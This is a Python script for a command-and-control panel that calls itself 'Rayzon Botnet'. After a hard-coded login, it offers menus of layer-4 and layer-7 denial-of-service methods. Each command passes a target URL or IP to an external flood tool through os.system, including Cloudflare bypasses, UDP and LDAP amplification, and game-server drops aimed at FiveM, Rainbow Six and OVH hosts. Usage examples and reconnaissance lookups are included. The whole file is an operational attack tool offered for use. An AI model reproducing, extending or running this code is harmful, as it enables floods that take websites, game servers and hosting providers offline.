import socket
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
    
proxys = open('proxies.txt').readlines()
bots = len(proxys)

def ascii_vro():
    clear()

def si():
    print('Welcome to Rayzon Botnet! ')
    

def tools():
    clear()
    si()
    print(f'''
 +--^----------,--------,-----,--------^-,
 | |||||||||   `--------'     |          O
 `+---------------------------^----------|
   `\_,---------,---------,--------------'
     / XXXXXX /'|       /'
    / XXXXXX /  `\    /'
   / XXXXXX /`-------'
  / XXXXXX / 
 / XXXXXX /
(________(   
 `------' 
                  
                                
                        T o o l s         
                ╔════════════════════════════
                ║        geoip               ║
                ║        reverseip           ║                  
                ║        subnet-lookup       ║                
                ║        asn-lookup          ║                 
                ║        dns-lookup          ║                
                ╚═════════════════════════════
''')

def rules():
    clear()
    si()
    print(f'''
 +--^----------,--------,-----,--------^-,
 | |||||||||   `--------'     |          O
 `+---------------------------^----------|
   `\_,---------,---------,--------------'
     / XXXXXX /'|       /'
    / XXXXXX /  `\    /'
   / XXXXXX /`-------'
  / XXXXXX / 
 / XXXXXX /
(________(   
 `------' 
                                ╔═══════════════╗
                                ║     Rules     ║
                ╔═══════════════╩═══════════════╩═══════════════╗
                ║                                               ║
                ║  Do not attack .gov/.gob/.edu/.mil domains    ║
                ║  Do not spam attacks                          ║
                ║  dont giving your user !!!!!!!!!!!            ║
                ║  telegram t.me/guesTool                       ║
                ║                                               ║
                ╚═══════════════════════════════════════════════╝
''')


def layer7():
    clear()
    si()
    print(f'''
 +--^----------,--------,-----,--------^-,
 | |||||||||   `--------'     |          O
 `+---------------------------^----------|
   `\_,---------,---------,--------------'
     / XXXXXX /'|       /'
    / XXXXXX /  `\    /'
   / XXXXXX /`-------'
  / XXXXXX / 
 / XXXXXX /
(________(   
 `------' 
                  
                              
                    ║    Layer 7    ║
               ╔═══════════════════════╦
               ║   killer              ║                    
               ║   bypass_2.js         ║                     
               ║   cf-bypass           ║                     
               ║   https-bypass        ║                   
               ║   http-raw            ║
               ║                       ║                     
               ╚═══════════════════════╩
''')

def layer4():
    clear()
    si()
    print(f'''
 +--^----------,--------,-----,--------^-,
 | |||||||||   `--------'     |          O
 `+---------------------------^----------|
   `\_,---------,---------,--------------'
     / XXXXXX /'|       /'
    / XXXXXX /  `\    /'
   / XXXXXX /`-------'
  / XXXXXX / 
 / XXXXXX /
(________(   
 `------' 
                        
               ╔═════════════════════╦
               ║                     ║          
               ║     UDP-RAW         ║           
               ║                     ║   
               ║                     ║            
               ╚══════════════════════
''')

def amp_games():
    clear()
    si()
    print(f'''
 +--^----------,--------,-----,--------^-,
 | |||||||||   `--------'     |          O
 `+---------------------------^----------|
   `\_,---------,---------,--------------'
     / XXXXXX /'|       /'
    / XXXXXX /  `\    /'
   / XXXXXX /`-------'
  / XXXXXX / 
 / XXXXXX /
(________(   
 `------' 
                  ╔═══════════════╗
                  ║Games          ║
               ╔═══════════════════════
               ║   ovhamp              ║
               ║   fivem-drop          ║       
               ╚═══════════════════════╩
''')


def menu():
    sys.stdout.write(f"\x1b]2;Rayzon Net --> Stars: [{bots}] | Online Users: [4] | Methods: [25] | Bypass: [10] | Amps: [1]\x07")
    clear()
    print('Welcome to Rayzon BOTNET! ')
    print("")
    print("""
Rayzon BotNET
 +--^----------,--------,-----,--------^-,
 | |||||||||   `--------'     |          O
 `+---------------------------^----------|
   `\_,---------,---------,--------------'
     / XXXXXX /'|       /'
    / XXXXXX /  `\    /'
   / XXXXXX /`-------'
  / XXXXXX / 
 / XXXXXX /
(________(   
 `------' 
             

""")
def main():
    menu()
    while(True):
        cnc = input('''\x1b[38;2;0;212;14m╔══[root@9baya7
''')
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            layer7()
        elif cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4":
            layer4()
        elif cnc == "amp/games" or cnc == "AMP/GAMES" or cnc == "amp/game" or cnc == "amps/game" or cnc == "amps/games" or cnc == "amp/games" or cnc == "AMP/GAME":
            amp_games()
        elif cnc == "rule" or cnc == "RULES" or cnc == "rules" or cnc == "RULES" or cnc == "RULE34":
            rules()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
        elif cnc == "ports" or cnc == "port" or cnc == "PORTS" or cnc == "PORT":
            ports()
        elif cnc == "tools" or cnc == "tool" or cnc == "TOOLS" or cnc == "TOOL":
            tools()
        
        elif "normal-bypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node httpbypassv2.js {url} {time}')
            except IndexError:
                print('Usage: normal-bypass <url> <time>')
                print('Example: use method port time threads')

        elif "cf-bypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                threads = cnc.split()[3]
                os.system(f'node cf.js {url} {time} {threads}')
            except IndexError:
                print('Usage: cf-bypass <url> <time> <threads>')
                print('Example: use method port time threads ')

        elif "https-bypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node https.js {url} {time} proxies.txt')
            except IndexError:
                print('Usage: https-bypass <url> <time>')
                print('Example:use method port time threads')

        elif "http-raw" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                method = cnc.split()[3]
                os.system(f'node HTTP-RAW.js {url} {time} {method}')
            except IndexError:
                print('Usage: https-raw <url> <time> <GET/POST/HEAD>')
                print('Example: use method port time threads')

        elif "cloudflare-uam" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                cpt = cnc.split()[3]
                os.system(f'node uambypass.js {url} {time} {cpt} proxies.txt ')
            except IndexError:
                print('Usage: cloudflare-uam <url> <time> <req_per_ip>')
                print('Example: use method port time threads')

        elif "http-overflow" in cnc:
            try:
                ip = cnc.split()[1]
                time = cnc.split()[2]
                threads = cnc.split()[3]
                os.system(f'./OVERFLOW {ip} {time} {threads}')
            except IndexError:
                print('Usage: http-overflow <ip> <time> <threads>')
                print('Example: use method port time threads')

        elif "http-get" in cnc:
            try:
                url = cnc.split()[1]
                idk = cnc.split()[2]
                idk1 = cnc.split()[3]
                idk2 = cnc.split()[4]
                os.system(f'perl httpget {url} {idk} {idk1} {idk2}')
            except IndexError:
                print('Usage: http-get <url> <10000> <50> <100>')
                print('Example: use method port time threads')

        elif "http-flood" in cnc:
            try:
                url = cnc.split()[1]
                threads = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'./httpflood {url} {threads} {method} {time} header.txt')
            except IndexError:
                print('Usage: http-flood <url> <threads> <get/post> <time>')
                print('Example: use method port time threads')

        elif "100up-bypass" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4]
                connections = cnc.split()[5]
                os.system(f'./100UP-TCP {method} {ip} {port} {time} {connections}')
            except IndexError:
                print('Usage: 100up-bypass <GET/POST/HEAD> <ip> <port> <time> <connections')
                print('Example: use method port time threads')

        elif "http-dstat" in cnc:
            try:
                url = cnc.split()[1]
                connections = cnc.split()[2]
                rps = cnc.split()[3]
                os.system(f'perl dstat.pl {url} {connections} {rps} 13.87')
            except IndexError:
                print('Usage: http-dstat <url> <connections> <rps>')
                print('Example: use method port time threads')

        elif "killer" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rps = cnc.split()[3]
                os.system(f'node killer.js {url} {time} request {rps}')
            except IndexError:
                print('Usage: killer <url> <time> <requests_per_second>')
                print('Example: goat-bypass http://example-protected-org 30 450')

        elif "geoip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/geoip/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: geoip <ip>')
                print('Example: geoip 1.1.1.1')

        elif "reverseip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reverseiplookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverseip <ip>')
                print('Example: reverseip 1.1.1.1')

        elif "subnet-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/subnetcalc/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: subnet-lookup <cdr/ip + netmask>')
                print('Example: subnet-lookup 192.168.1.0/24')

        elif "asn-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/aslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: asn-lookup <ip/asn>')
                print('Example: asn-lookup AS15169')

        elif "dns-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/dnslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: dns-lookup <dns>')
                print('Example: dns-lookup google.com')

        elif "reverse-dns" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reversedns/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverse-dns <ip/domain>')
                print('Example: reverse-dns 8.8.8.8')                

        elif "http-fuzz" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node httpfuzz.js {url} proxies.txt {time} POST')
            except IndexError:
                print(f'Usage: http-fuzz <url> <time>')
                print("Example: http-fuzz http://sexo.org 30")

        elif "autobypass" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'./AUTOBYPASS TCP {ip} {port} {time}')
            except IndexError:
                print('Usage: autobypass <ip> <port> <time>')
                print('Example: autobypass 188.40.1XX.XX 80 30')

        elif "http-rand" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAND.js {url} {time}')
            except IndexError:
                print("Usage: http-rand <url> <time>")
                print("Example: http-rand http://si.com 10")

        elif 'ldap-vro' in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                threads = cnc.split()[3]
                pps = cnc.split()[4]
                time = cnc.split()[5]
                os.system(f'sudo ./ldapv2 {ip} {port} ldaplist.txt {threads} {pps} {time}')
            except IndexError:
                print(f'Usage: ldap-vro <ip> <port> <threads> <pps> <time>')
                print(f'Example: ldap-vro 1.1.1.1 8739 15 1024 50')

        elif "ovhamp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'sudo ./OVH-AMP {ip} {port}')
            except IndexError:
                print(f'Usage: ovhamp <ip> <port>')
                print(f'Example: ovhamp 1.1.1.1 34264')

        elif "fivem-drop" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                threads = cnc.split()[3]
                pps = cnc.split()[4]
                time = cnc.split()[5]
                os.system(f'sudo ./fivem {ip} {port} fivem.txt {threads} {pps} {time}')
            except IndexError:
                print('Usage: fivem-drop <ip> <port> <threads> <pps> <time>')
                print('Example: fivem-drop 1.1.1.1 30120 15 80000 30')

        elif "fortnite-fly" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                threads = cnc.split()[3]
                time = cnc.split()[4]
                pps = cnc.split()[5]
                os.system(f'python3 FORTNITE-FLY.py {ip} {port} {threads} {time} {pps}')
            except IndexError:
                print('Usage: fornite-fly <ip> <port> <threads> <time> <pps>')
                print(f'Example: fortnite-fly 1.1.1.1 45 30 50 100000')

        elif "udp-god" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                threads = cnc.split()[3]
                throttle = cnc.split()[4]
                time = cnc.split()[5]
                os.system(f'sudo ./udp {ip} {port} {threads} {throttle} {time}')
            except IndexError:
                print(f'Usage: udp-god <ip> <port> <threads> <throttle> <time>')
                print(f'Example: udp-god 1.1.1.1 80 30 40000 30')

        elif "haven-god" in cnc:
            try:
                ip = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'sudo ./haven -d {ip} -t {time} -z 130')
            except IndexError:
                print('Usage: haven-god <ip> <time>')
                print('Example: haven-god 192.168.0.1 30')

        elif "telnet-god" in cnc:
            try:
                ip = cnc.split()[1]
                threads = cnc.split()[2]
                pps = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'sudo ./telnet {ip} {threads} {pps} {time}')
            except IndexError:
                print(f'Usage: telnet-god <ip> <threads> <pps> <time>')
                print('Example: telnet-god 192.168.0.1 30 80000 50')

        elif "home-god" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                psize = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'perl home.pl {ip} {port} {psize} {time}')
            except IndexError:
                print(f'Usage: home-god <ip> <port> <packet_size> <time>')
                print(f'Example: home-god 1.1.1.1 80 1024 50')

        elif "r6-drop" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                threads = cnc.split()[3]
                pps = cnc.split()[4]
                time = cnc.split()[5]
                os.system(f'sudo ./R6-DROP {ip} {port} {threads} {pps} {time}')
            except IndexError:
                print('Usage: r6-drop <ip> <port> <threads> <pps> <time>')
                print('Example: r6-drop 1.1.1.1 8739 20 50000 30')

        elif "vse" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                threads = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'sudo ./vse {ip} {port} {threads} {time}')
            except IndexError:
                print('Usage: vse <ip> <port> <threads> <time>')
                print('Example: vse 1.1.1.1 80 30 50')

        elif "ovh-fuck" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'sudo ./MertOVH {ip} {port}')
            except IndexError:
                print('Usage: game-crash <ip> <port>')
                print('Example: game-crash 192.168.0.1 22')

        elif "cloudflare-lag" in cnc:
            print('Method "CLOUDFLARE-LAG" not enabled')

        elif "help" in cnc:
            print(f'''
 +--^----------,--------,-----,--------^-,
 | |||||||||   `--------'     |          O
 `+---------------------------^----------|
   `\_,---------,---------,--------------'
     / XXXXXX /'|       /'
    / XXXXXX /  `\    /'
   / XXXXXX /`-------'
  / XXXXXX / 
 / XXXXXX /
(________(   
 `------' 
                              !  H E L P 
                        
             ╔═════════════════════╦══╦═════════════════════╦═══╦
             ║  layer7             ║  ║  tools              ║   ║                
             ║  layer4             ║  ║  rules              ║   ║                
             ╚═════════════════════╩══╩═════════════════════╩═══╩

            ''')
        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass


def login():
    clear()
    user = "9baya7"
    passwd = "elkatiba"
    username = input("! Username: ")
    password = getpass.getpass(prompt='! Password: ')
    if username != user or password != passwd:
        print("")
        print("</> Invalid credentials! Abandoning...")
        sys.exit(1)
    elif username == user and password == passwd:
        print("</> Welcome to Rayzon botnet!")
        time.sleep(0.3)
        ascii_vro()
        main()

login()
